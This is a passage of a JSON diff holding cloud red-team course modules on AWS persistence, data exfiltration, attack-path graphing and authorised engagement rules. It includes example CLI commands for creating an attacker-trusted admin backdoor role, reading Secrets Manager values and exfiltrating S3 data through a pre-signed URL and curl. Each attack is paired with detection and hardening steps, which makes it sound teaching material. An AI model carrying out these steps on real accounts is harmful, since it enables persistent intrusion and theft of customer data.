+                  "command": "aws iam get-user-policy --user-name ci-deploy --policy-name inline --query 'PolicyDocument.Statement[?Action==`iam:PassRole`]'",
+                  "output": "[ { \"Effect\": \"Allow\", \"Action\": \"iam:PassRole\", \"Resource\": \"*\" } ]"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Defend and Harden It",
+            "body": "Cut the glue that makes pivoting cheap:\n\n- Enforce IMDSv2 (HttpTokens=required) and set the hop limit to 1 so containers cannot reach instance metadata.\n- Scope iam:PassRole to exact role ARNs, never Resource \"*\". A role should only be passable to the specific service that needs it, with iam:PassedToService conditions.\n- Least-privilege instance/execution roles: the app role should read only its own bucket, not every bucket.\n- Restrict ssm:SendCommand/StartSession to a small admin group and log every session.\n\nThe theme: each pivot edge is a specific permission pairing. Break the pairing (PassRole + create, or SSRF + IMDSv1) and the pivot disappears.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Pivot-friendly",
+                  "points": [
+                    "IMDSv1 optional",
+                    "PassRole on \"*\"",
+                    "App role = S3FullAccess",
+                    "SendCommand broadly granted"
+                  ]
+                },
+                {
+                  "label": "Hardened",
+                  "points": [
+                    "IMDSv2 required, hop limit 1",
+                    "PassRole scoped to one role ARN",
+                    "App role = one bucket, read-only",
+                    "SSM restricted + logged"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Cross-service pivoting is how a single foothold turns into account-wide access without ever touching a network scanner. The permissions that enable it, PassRole, broad instance roles, open SSM, look innocuous in isolation, which is why they persist in real environments.\n\nUnderstanding these edges is also what makes attack-path graphing (the next topics) powerful: the graph is built almost entirely from these service-to-service and PassRole edges.\n\nIn the Cross-Service lab you chain an instance-role grab into data access, exactly the EC2-to-metadata-to-S3 path behind the 2019 Capital One breach, where an SSRF reached IMDSv1 and read 100M+ records from S3."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m11-4",
+        "moduleId": "cloud-m11",
+        "number": 68,
+        "title": "Persistence at Scale",
+        "type": "theory",
+        "week": 4,
+        "description": "Durable footholds beyond a single backdoor key. Students study stealthy, org-level persistence and how to hunt it.",
+        "keyPoints": [
+          "Backdoor roles, IdP federation tampering, and SSO persistence",
+          "Lambda/EventBridge triggers for re-entry on events",
+          "Weakening SCPs/boundaries and GuardDuty suppression as persistence",
+          "Infrastructure-as-code poisoning (Terraform/CloudFormation) for redeploy persistence",
+          "Threat-hunting these: config drift, Access Analyzer, CloudTrail baselines"
+        ],
+        "slides": [
+          {
+            "title": "What Persistence at Scale Is",
+            "body": "Persistence is keeping a reliable way back in after the first credential is burned. 'At scale' means durable, stealthy footholds at the organization level, not just one extra access key that a rotation would kill.\n\nAnalogy: a burglar who, instead of keeping the stolen key, quietly cuts a new key, befriends the night guard, and tampers with the alarm schedule. Even if the locks are changed, several independent ways back remain.\n\nGood cloud persistence blends into normal operations: it looks like ordinary IAM, ordinary automation, ordinary infrastructure-as-code.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "foot",
+                  "label": "Initial foothold",
+                  "highlighted": true
+                },
+                {
+                  "id": "role",
+                  "label": "Backdoor role"
+                },
+                {
+                  "id": "idp",
+                  "label": "IdP / SSO tamper"
+                },
+                {
+                  "id": "event",
+                  "label": "EventBridge trigger"
+                },
+                {
+                  "id": "iac",
+                  "label": "Poisoned IaC"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "foot",
+                  "to": "role",
+                  "label": "create"
+                },
+                {
+                  "from": "foot",
+                  "to": "idp",
+                  "label": "federate"
+                },
+                {
+                  "from": "foot",
+                  "to": "event",
+                  "label": "arm"
+                },
+                {
+                  "from": "foot",
+                  "to": "iac",
+                  "label": "seed"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Identity Persistence",
+            "body": "The most direct persistence is a backdoor identity the defender will not immediately notice.\n\n- Backdoor IAM role: create a role trusting an attacker-controlled account, with broad permissions. It survives password resets and key rotations because it is a separate principal.\n- Extra access keys: IAM users can hold two access keys; adding a second to a legitimate user is quiet.\n- IdP / federation tampering: add a trust to an attacker IdP, or register a new SAML/OIDC provider, so the attacker can mint federated sessions. SSO persistence (e.g. adding a permission set or a rogue user in IAM Identity Center) re-grants console access org-wide.\n\nThese map to ATT&CK T1098 (Account Manipulation) and T1136 (Create Account).",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam create-role --role-name support-audit --assume-role-policy-document file://trust-attacker.json",
+                  "output": "Role: arn:aws:iam::999...:role/support-audit  (trusts 444...:root)"
+                },
+                {
+                  "command": "aws iam attach-role-policy --role-name support-audit --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+                  "output": ""
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Event-Driven Re-Entry",
+            "body": "Instead of a static door, attackers arm triggers that re-grant access automatically when something happens.\n\nMechanism: a Lambda function with a powerful role, invoked by an EventBridge rule. The rule watches for an event, say, a new IAM user is created, or a daily schedule, and fires the Lambda, which re-creates the attacker's backdoor if it was removed.\n\nThis is 'self-healing' persistence: a defender deletes the backdoor key, and minutes later the Lambda recreates it. It maps to ATT&CK T1546 (Event Triggered Execution). The EventBridge rule and Lambda look like ordinary automation unless someone reads the function code.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "EventBridge rule",
+                  "detail": "on schedule or IAM event"
+                },
+                {
+                  "label": "Invokes Lambda",
+                  "detail": "runs with powerful role"
+                },
+                {
+                  "label": "Lambda re-creates",
+                  "detail": "backdoor key / role"
+                },
+                {
+                  "label": "Attacker back in",
+                  "detail": "even after cleanup"
+                }
+              ]
+            },
+            "check": {
+              "question": "A defender deletes the attacker's backdoor access key, but it reappears within minutes. What persistence mechanism is most likely?",
+              "options": [
+                "The key was never actually deleted due to eventual consistency",
+                "An EventBridge rule is invoking a Lambda that re-creates the key (self-healing persistence)",
+                "CloudTrail automatically restores deleted keys",
+                "The AWS root user is recreating it"
+              ],
+              "correctIndex": 1,
+              "explanation": "Self-healing persistence uses an event-triggered Lambda (via EventBridge, often on a schedule or watching for its own deletion) to recreate the backdoor. Killing it requires finding and removing the rule and function, not just deleting the key. This is why hunters must look for orphaned automation, not just rogue credentials."
+            }
+          },
+          {
+            "title": "Variant: Weakening the Guardrails",
+            "body": "Subtle persistence works by degrading detection and prevention so future actions go unnoticed, rather than adding anything obvious.\n\n- Loosen or detach SCPs / permission boundaries so the attacker's actions are no longer blocked org-wide.\n- GuardDuty suppression: create suppression rules or disable detectors/data sources so malicious findings are auto-archived.\n- Stop or filter CloudTrail: delete a trail, or add an event selector that excludes the attacker's region or S3 data events.\n\nThis is persistence by blinding the defender. It maps to ATT&CK T1562 (Impair Defenses). It is dangerous precisely because nothing new appears, something protective quietly disappears.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Loud persistence",
+                  "points": [
+                    "New admin user",
+                    "New access key",
+                    "Shows up in alerts"
+                  ]
+                },
+                {
+                  "label": "Quiet persistence",
+                  "points": [
+                    "GuardDuty suppression rule",
+                    "CloudTrail selector gap",
+                    "Loosened SCP",
+                    "Looks like config, not attack"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variant: Infrastructure-as-Code Poisoning",
+            "body": "The stealthiest org-scale persistence hides in the pipeline that builds the environment.\n\nMechanism: the attacker edits Terraform or CloudFormation in the source repo to include a backdoor, an extra IAM role, an open security group, a trust to their account. On the next deploy, the organization's own CI/CD re-creates the backdoor as 'intended' infrastructure.\n\nNow the persistence is blessed by the pipeline. Even a full environment rebuild redeploys it, and it passes review if the malicious diff is small and buried. This maps to ATT&CK T1505/T1195 territory (supply chain / server component). Defenders must treat the IaC repo and CI roles as crown jewels.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Edit IaC repo",
+                  "detail": "add backdoor role to module"
+                },
+                {
+                  "label": "PR merged",
+                  "detail": "small diff, slips review"
+                },
+                {
+                  "label": "CI/CD deploys",
+                  "detail": "pipeline role applies it"
+                },
+                {
+                  "label": "Backdoor is 'official'",
+                  "detail": "survives rebuilds"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How to Hunt It",
+            "body": "Threat-hunting cloud persistence is about comparing against a known-good baseline and watching for drift.\n\n- Config drift: AWS Config records every resource change over time; diff current IAM/SCP/trail state against baseline to spot new roles, loosened policies, or disabled logging.\n- IAM Access Analyzer: flags newly externally-trusted roles (a backdoor role trusting an outside account).\n- CloudTrail baselines: alert on iam:CreateRole, CreateAccessKey, PutRolePolicy, DeleteTrail, CreateDetector suppression, and new SAML/OIDC providers, especially outside change windows.\n- Review all Lambda + EventBridge rules for ones no team owns.\n\nThe mindset: enumerate what should exist, diff against what does.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey --max-results 5",
+                  "output": "- Username: billing-svc  (never used API before)\n  SourceIP: 203.0.113.44  (Tor exit)\n  Time: 02:14 UTC (outside change window)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Defend It and Why It Matters",
+            "body": "Defences: immutable, append-only CloudTrail to an isolated logging account; GuardDuty in a delegated-admin security account the workload accounts cannot disable; SCPs that deny disabling CloudTrail/GuardDuty and deny creating IAM identity providers outside a break-glass path; signed IaC with mandatory review and protected pipeline roles; periodic Config-drift and Access-Analyzer sweeps.\n\nWhy it matters: persistence is what turns a contained incident into a months-long compromise. The headline breaches are rarely the initial bug, they are the undetected dwell time that followed. For a red-teamer, demonstrating durable, self-healing persistence is often the most sobering part of a report; for the blue team, cutting it is how you shorten dwell time to near zero.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Fragile estate",
+                  "points": [
+                    "Logging disableable by workload accts",
+                    "No SCP guardrails",
+                    "Unreviewed IaC",
+                    "No drift detection"
+                  ]
+                },
+                {
+                  "label": "Resilient estate",
+                  "points": [
+                    "Append-only logs in isolated account",
+                    "SCP denies disabling CloudTrail/GuardDuty",
+                    "Signed, reviewed IaC",
+                    "Continuous Config drift + Access Analyzer"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m11-5",
+        "moduleId": "cloud-m11",
+        "number": 69,
+        "title": "Data Collection & Exfiltration",
+        "type": "lab",
+        "week": 4,
+        "description": "The objective of most intrusions. Students practise finding and extracting the crown-jewel data and the signals it generates.",
+        "keyPoints": [
+          "Locating sensitive data: S3, RDS, DynamoDB, snapshots, Secrets Manager",
+          "Exfil channels: public bucket, pre-signed URL, snapshot share, cross-account copy",
+          "Staging and compression; avoiding detection thresholds",
+          "The detection signatures each channel leaves (ties to the detection module)",
+          "DLP controls: Macie, egress filtering, bucket policies"
+        ],
+        "slides": [
+          {
+            "title": "What Collection and Exfiltration Are",
+            "body": "Collection is finding and staging the valuable data. Exfiltration is getting it out of the account. For most intrusions this is the whole point, data is the money.\n\nAnalogy: the burglar who has roamed the house now gathers the jewellery into one bag (collection) and decides how to carry it past the cameras to the car (exfiltration). The choice of exit, front door, back window, or handing it to an accomplice, determines how likely they are to be seen.\n\nIn cloud, the 'exits' are specific API features, and each one leaves a different trail.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Locate",
+                  "detail": "find crown-jewel data"
+                },
+                {
+                  "label": "Stage",
+                  "detail": "gather / compress"
+                },
+                {
+                  "label": "Choose channel",
+                  "detail": "bucket / URL / snapshot"
+                },
+                {
+                  "label": "Exfiltrate",
+                  "detail": "move out of account"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Locating Sensitive Data",
+            "body": "Before exfil you must find what is worth taking. Cloud data hides in predictable places:\n\n- S3 buckets: app data, logs, backups, exports. List them, sample object keys, look for dumps.\n- RDS / Aurora: production databases; often reachable via a compromised app role or by sharing a snapshot.\n- DynamoDB: NoSQL tables of user records.\n- EBS / RDS snapshots: point-in-time copies of whole disks and databases, frequently forgotten and over-shared.\n- Secrets Manager / SSM Parameter Store: API keys, DB passwords, tokens, often the real crown jewel because they unlock everything else.\n\nSecrets first: one leaked DB password can beat exfiltrating a terabyte.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws secretsmanager list-secrets --query 'SecretList[].Name'",
+                  "output": "[ \"prod/db/master\", \"stripe/live/key\", \"jwt/signing\" ]"
+                },
+                {
+                  "command": "aws secretsmanager get-secret-value --secret-id prod/db/master --query SecretString --output text",
+                  "output": "{\"username\":\"admin\",\"password\":\"S3cr-...\",\"host\":\"prod-db.xxx.rds.amazonaws.com\"}"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Exfiltration Channels",
+            "body": "Each channel is a legitimate feature turned against its owner. The attacker picks the one that fits their access and is least likely to trip detection.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Make-it-public",
+                  "points": [
+                    "Open bucket policy / ACL",
+                    "Public RDS/EBS snapshot",
+                    "Loud: Access Analyzer + GuardDuty flag"
+                  ]
+                },
+                {
+                  "label": "Pull-to-attacker",
+                  "points": [
+                    "S3 pre-signed URL",
+                    "Snapshot shared to attacker acct",
+                    "Cross-account S3 copy",
+                    "Quieter: looks like normal API use"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            },
+            "check": {
+              "question": "An attacker wants to exfiltrate an EBS volume's data to an account they control, while looking like normal operations. Which technique best fits?",
+              "options": [
+                "Make the EBS snapshot public to the whole internet",
+                "Create a snapshot and use ModifySnapshotAttribute to share it only with the attacker's account, then copy it there",
+                "Email the raw disk image to themselves",
+                "Delete the volume so no one notices"
+              ],
+              "correctIndex": 1,
+              "explanation": "Sharing a snapshot with a specific external account (CreateSnapshot + ModifySnapshotAttribute) is quieter than making it public: it does not trigger 'public resource' detections, yet it hands the attacker a full copy of the disk to restore in their own account. Public snapshots are loud and caught by Access Analyzer/GuardDuty; deleting the volume is destruction, not exfil."
+            }
+          },
+          {
+            "title": "Worked Example: Pre-Signed URL Exfil",
+            "body": "A pre-signed URL lets anyone with the link download a private S3 object, no AWS credentials needed, for a limited time. An attacker with s3:GetObject generates one and fetches it from any machine. To the bucket it looks like an ordinary authorised GET.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws s3 presign s3://app-backups-encrypted/customers.csv.gz --expires-in 3600",
+                  "output": "https://app-backups-encrypted.s3.amazonaws.com/customers.csv.gz?X-Amz-Signature=...&X-Amz-Expires=3600"
+                },
+                {
+                  "command": "curl -o loot.csv.gz 'https://app-backups-encrypted.s3.amazonaws.com/customers.csv.gz?X-Amz-Signature=...'",
+                  "output": "  % Total    Received   Time\n100  412M  100  412M   0:00:22   (downloaded from attacker laptop)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variant: Staging, Compression and Low-and-Slow",
+            "body": "To avoid tripping detection thresholds, attackers shape the transfer:\n\n- Staging: copy scattered data into one bucket/prefix they control first, then exfil in a single clean operation.\n- Compression: gzip/zip to shrink volume and reduce the number of requests and bytes that an anomaly detector sees.\n- Low-and-slow: spread the transfer over hours or days, stay under GuardDuty's volume-based exfiltration heuristics, and use cross-region or cross-account copies that look like backups.\n\nThe tension for the attacker is speed vs stealth. Grabbing everything at once is fast but noisy; low-and-slow evades thresholds but lengthens dwell time and exposure.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Stage",
+                  "detail": "consolidate into one prefix"
+                },
+                {
+                  "label": "Compress",
+                  "detail": "gzip to cut bytes/requests"
+                },
+                {
+                  "label": "Throttle",
+                  "detail": "spread over hours"
+                },
+                {
+                  "label": "Exfil",
+                  "detail": "under detection thresholds"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The Detection Signatures Each Channel Leaves",
+            "body": "Every exfil method generates signals the blue team can hunt, this ties directly to the cloud detection module.\n\n- Public bucket / snapshot: GuardDuty (Policy/Exfiltration findings), IAM Access Analyzer 'public' finding, Config 's3-bucket-public-read' noncompliance.\n- Pre-signed URL abuse: a GetObject from an unusual IP/UA, or many presign operations; CloudTrail data events on the bucket are essential (they are off by default).\n- Snapshot shared externally: ModifySnapshotAttribute to an unknown account, a high-signal CloudTrail event.\n- Cross-account copy / large downloads: GuardDuty Exfiltration:S3/AnomalousBehavior, CloudWatch billing/egress spikes.\n\nKnowing the signature is both how defenders catch you and how, as a red-teamer, you predict what you will leave behind.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws guardduty list-findings --detector-id $D --finding-criteria '{\"Criterion\":{\"type\":{\"Eq\":[\"Exfiltration:S3/ObjectRead.Unusual\"]}}}'",
+                  "output": "- Exfiltration:S3/ObjectRead.Unusual  severity 8.0\n  bucket: app-backups-encrypted  actor: role/ec2-app-role  remoteIp: 203.0.113.44"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Defend It and Why It Matters",
+            "body": "DLP and egress controls close or alarm each channel:\n\n- Amazon Macie: continuously discovers and classifies sensitive data (PII, secrets) in S3, so you know where the crown jewels are before an attacker does.\n- Block Public Access at the account level, and SCPs denying public bucket policies and public snapshots, kill the loud channels outright.\n- Egress filtering / VPC endpoints: keep S3/DynamoDB traffic on private endpoints so data cannot be copied to arbitrary external destinations; restrict snapshot sharing with SCPs.\n- Enable CloudTrail S3 data events and GuardDuty S3 protection so pull-style exfil is actually visible.\n\nWhy it matters: exfiltration is the stage that converts access into a breach notification, regulatory fines and customer harm. In the lab you will exfil crown-jewel data by multiple channels and then enumerate exactly which detection each one would have tripped, the core of a credible impact-and-remediation story.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Exposed",
+                  "points": [
+                    "No data events logged",
+                    "Public access allowed",
+                    "Snapshots shareable anywhere",
+                    "No data classification"
+                  ]
+                },
+                {
+                  "label": "Defended",
+                  "points": [
+                    "S3 data events + GuardDuty on",
+                    "Block Public Access + SCP deny",
+                    "Snapshot-share restricted",
+                    "Macie finds crown jewels first"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m11-6",
+        "moduleId": "cloud-m11",
+        "number": 70,
+        "title": "Attack-Path Graphing & Choke Points",
+        "type": "exercise",
+        "week": 4,
+        "description": "Thinking like an attack-path analyst. Students compute the graph of possible paths and identify the few edges whose removal collapses the most paths.",
+        "keyPoints": [
+          "PMapper / Cartography to compute all principal-to-crown-jewel paths",
+          "Identifying choke-point permissions (iam:PassRole, broad AssumeRole) to cut",
+          "Quantifying risk by number and length of paths to high-value assets",
+          "Prioritising remediation by path-count reduction, not finding count",
+          "Communicating paths to defenders as actionable edge-removal"
+        ],
+        "slides": [
+          {
+            "title": "What Attack-Path Graphing Is",
+            "body": "An attack path is a chain of permissions and trusts that leads a starting principal to a high-value asset. Attack-path graphing computes all such chains across the whole account and draws them as a graph.\n\nAnalogy: a subway map. Stations are principals and resources; lines are permissions like AssumeRole or PassRole. You are at one station (a low-priv user) and you want to know every route to the vault station, and which single line closure cuts the most routes.\n\nThe shift in mindset: stop counting findings, start counting paths to the crown jewels.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "u",
+                  "label": "ci-deploy (start)",
+                  "highlighted": true
+                },
+                {
+                  "id": "r1",
+                  "label": "lambda-exec-role"
+                },
+                {
+                  "id": "r2",
+                  "label": "admin-role"
+                },
+                {
+                  "id": "s3",
+                  "label": "crown-jewel S3",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "u",
+                  "to": "r1",
+                  "label": "PassRole+CreateFunction"
+                },
+                {
+                  "from": "r1",
+                  "to": "r2",
+                  "label": "AssumeRole"
+                },
+                {
+                  "from": "r2",
+                  "to": "s3",
+                  "label": "s3:GetObject"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: PMapper and Cartography",
+            "body": "Two open-source tools dominate.\n\n- PMapper (Principal Mapper, NCC Group): pulls your IAM data, models every principal and the IAM 'edges' between them (AssumeRole, PassRole+create, iam:CreatePolicyVersion, UpdateFunctionCode, and dozens more escalation primitives), and builds a directed graph. You then query 'can principal X reach admin / resource Y?' and it returns the path.\n- Cartography (Lyft): ingests AWS (and more) into a Neo4j graph database, so you can run Cypher queries across IAM, EC2, S3, VPC and cross-account relationships for broader asset graphs.\n\nBoth turn the question 'is there a path?' from manual policy-reading into an automated graph traversal.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Ingest",
+                  "detail": "pull IAM / resource data"
+                },
+                {
+                  "label": "Model edges",
+                  "detail": "AssumeRole, PassRole, UpdateCode..."
+                },
+                {
+                  "label": "Build graph",
+                  "detail": "principals + resources"
+                },
+                {
+                  "label": "Query paths",
+                  "detail": "start -> crown jewel"
+                }
+              ]
+            },
+            "check": {
+              "question": "What does an 'edge' represent in a PMapper IAM graph?",
+              "options": [
+                "A physical network cable between two servers",
+                "A way one principal can gain the privileges of another (e.g. via AssumeRole or PassRole+CreateFunction)",
+                "A billing boundary between accounts",
+                "An encryption key rotation event"
+              ],
+              "correctIndex": 1,
+              "explanation": "An edge is a privilege-escalation or access relationship: proof that principal A can act as, or gain the permissions of, principal B through some IAM mechanism. Chaining edges forms an attack path from a low-priv start to a high-value target. Edges are about identity and permissions, not network cabling."
+            }
+          },
+          {
+            "title": "Worked Example: Querying a Path",
+            "body": "You load your account into PMapper and ask whether the low-priv ci-deploy user can reach administrator. PMapper reports the exact chain of edges, which is also your reproduction steps for the report.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "pmapper graph create",
+                  "output": "Graph created: account 111122223333  (142 nodes, 318 edges)"
+                },
+                {
+                  "command": "pmapper query 'preset privesc user/ci-deploy'",
+                  "output": "user/ci-deploy CAN escalate privileges:\n  ci-deploy -(PassRole, lambda:CreateFunction)-> role/lambda-exec-role\n  lambda-exec-role -(sts:AssumeRole)-> role/admin-role  [ADMIN]"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Choke Points: The Edges Worth Cutting",
+            "body": "A choke point is an edge that many paths route through. Remove it and a large fraction of all attack paths collapse at once.\n\nThe usual suspects are the broad, reusable permissions:\n- iam:PassRole (especially on Resource \"*\") feeds almost every compute-based escalation.\n- Broad sts:AssumeRole / over-trusting trust policies bridge principals and accounts.\n- iam:CreatePolicyVersion, iam:AttachRolePolicy, lambda:UpdateFunctionCode, and similar 'rewrite my own power' permissions.\n\nBecause so many paths share these few edges, cutting one can eliminate dozens of distinct routes, far more effective than fixing the many individual findings those routes are made of.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "a",
+                  "label": "user A"
+                },
+                {
+                  "id": "b",
+                  "label": "user B"
+                },
+                {
+                  "id": "c",
+                  "label": "user C"
+                },
+                {
+                  "id": "choke",
+                  "label": "PassRole choke",
+                  "highlighted": true
+                },
+                {
+                  "id": "cj",
+                  "label": "crown jewel",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "a",
+                  "to": "choke",
+                  "label": "PassRole"
+                },
+                {
+                  "from": "b",
+                  "to": "choke",
+                  "label": "PassRole"
+                },
+                {
+                  "from": "c",
+                  "to": "choke",
+                  "label": "PassRole"
+                },
+                {
+                  "from": "choke",
+                  "to": "cj",
+                  "label": "admin"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Quantifying Risk by Paths, Not Findings",
+            "body": "Graphing lets you measure risk numerically instead of by gut feel:\n\n- Path count: how many distinct routes exist from untrusted/low-priv principals to each crown jewel. More routes = more exposure and more redundancy for the attacker.\n- Path length: shorter paths are easier and more reliable to exploit; a one-edge path is nearly guaranteed.\n- Reachable principals: how many identities can reach the crown jewel at all (the attack surface for that asset).\n\nThis gives defenders a priority that a flat findings list cannot: focus on the assets with the most, and shortest, paths, and on the edges that appear in the most paths.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Finding-count view",
+                  "points": [
+                    "200 'medium' misconfigs",
+                    "No sense of connection",
+                    "Fix order unclear",
+                    "Fatigue, little risk reduction"
+                  ]
+                },
+                {
+                  "label": "Path-count view",
+                  "points": [
+                    "12 paths to crown jewels",
+                    "3 share one PassRole edge",
+                    "Cut that edge -> 9 paths gone",
+                    "Clear, measurable priority"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Prioritise and Communicate to Defenders",
+            "body": "Remediation is ranked by path-count reduction, not by how many findings a fix closes on paper. The best fix is the single edge removal that collapses the most paths to the highest-value assets.\n\nCommunicate it as actionable edge removal, not vague advice:\n- 'Scope iam:PassRole on user/ci-deploy to only role/ci-build (remove Resource \"*\")' is an edge cut.\n- 'Remove the AssumeRole trust from account 111 on role/admin-role' is an edge cut.\n\nPair each recommendation with the number of paths it removes ('this one change eliminates 9 of 12 paths to the prod data store'). Defenders act on measurable, specific edges, that is what makes a choke-point report persuasive.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Compute all paths",
+                  "detail": "start -> crown jewels"
+                },
+                {
+                  "label": "Rank edges",
+                  "detail": "by paths removed if cut"
+                },
+                {
+                  "label": "Recommend cuts",
+                  "detail": "specific policy edits"
+                },
+                {
+                  "label": "Quantify win",
+                  "detail": "9 of 12 paths gone"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Individual misconfigurations are cheap and endless; the connections between them are where real risk lives. Attack-path graphing is the discipline that makes that risk visible and measurable, and it is exactly how modern CNAPP products (Wiz, Orca, Prisma Cloud) present 'toxic combinations' and attack paths rather than raw findings.\n\nFor the attacker, the graph is the shortest route to the goal. For the defender, it reveals the handful of choke-point edges whose removal buys the most safety per change.\n\nIn the Choke-Point Report lab you will run PMapper against an AWS sandbox, compute all paths to the crown jewels, and recommend the minimal set of permission removals that collapses the most paths, the most senior-level deliverable in this module."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m11-7",
+        "moduleId": "cloud-m11",
+        "number": 71,
+        "title": "Running a Cloud Red-Team Engagement",
+        "type": "theory",
+        "week": 4,
+        "description": "The professional wrapper: scoping, rules of engagement, authorisation, OPSEC and reporting for an authorised cloud red-team, with ethics front and centre.",
+        "keyPoints": [
+          "Written authorisation and scope (accounts, assets, allowed techniques)",
+          "OPSEC: staying under GuardDuty thresholds only where ROE permits",
+          "Never exfiltrate real user data beyond PoC need; evidence handling",
+          "Reporting: attack narrative, evidence, business impact, remediation",
+          "Purple-teaming: validating detections with the blue team"
+        ],
+        "slides": [
+          {
+            "title": "What a Cloud Red-Team Engagement Is",
+            "body": "A red-team engagement is an authorised, goal-driven simulation of a real adversary against an organization's cloud, run under strict rules so it produces security value without causing harm or crossing legal lines.\n\nAnalogy: hiring a professional 'burglar' to try to reach the vault, with a signed contract saying which buildings they may enter, what they may touch, and that they will hand back a report instead of keeping the jewellery.\n\nEverything in this module, kill chains, pivoting, persistence, exfiltration, becomes a profession only when wrapped in authorisation, scope, OPSEC and reporting. Without that wrapper it is just crime.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Authorise",
+                  "detail": "written permission + scope"
+                },
+                {
+                  "label": "Rules of engagement",
+                  "detail": "allowed techniques, timing"
+                },
+                {
+                  "label": "Execute (OPSEC)",
+                  "detail": "attack under constraints"
+                },
+                {
+                  "label": "Report + purple",
+                  "detail": "findings, validate detections"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Written Authorisation and Scope",
+            "body": "Nothing starts without written authorisation from someone empowered to grant it. This is both the legal shield and the definition of the game.\n\nScope must state, explicitly:\n- Which AWS accounts and assets are in bounds (account IDs, ARNs, data stores), and which are expressly out.\n- Allowed and forbidden techniques (e.g. no destructive actions, no real-data exfiltration, no DoS, no social engineering unless named).\n- Time window and any blackout periods.\n\nCrucially, authorisation covers only your own or the client's assets. You can never in-scope a third-party SaaS, another tenant, or the cloud provider's own infrastructure just because your target touches it. If a path leads out of scope, you stop and document, you do not cross.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "In scope",
+                  "points": [
+                    "Named account IDs",
+                    "Listed asset ARNs",
+                    "Agreed techniques",
+                    "Owned sandbox / prod with sign-off"
+                  ]
+                },
+                {
+                  "label": "Out of scope (hard stop)",
+                  "points": [
+                    "Other tenants / customers",
+                    "Third-party SaaS & vendors",
+                    "Cloud provider infra",
+                    "Any technique not authorised"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Rules of Engagement and Allowed Techniques",
+            "body": "The Rules of Engagement (ROE) are the detailed contract for how you operate. They translate scope into day-to-day decisions.\n\nTypical ROE content: approved technique list, data-handling rules, a 'stop conditions' clause (what forces an immediate halt, e.g. evidence of a real prior breach), emergency contacts on both sides, and a deconfliction process so the blue team can check whether suspicious activity is you or a genuine attacker.\n\nThe ROE is what you consult in the moment: 'am I allowed to assume this cross-account role?' 'may I actually download this data or only prove I could?' When in doubt, the ROE and your point of contact decide, not your curiosity.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Red team",
+              "rightLabel": "Client POC",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "Deconfliction",
+                  "payload": "Is alert GuardDuty#4821 at 02:14 us? (yes/no)"
+                },
+                {
+                  "direction": "left",
+                  "label": "Confirm",
+                  "payload": "Yes - that is your test, standing down IR"
+                }
+              ]
+            },
+            "check": {
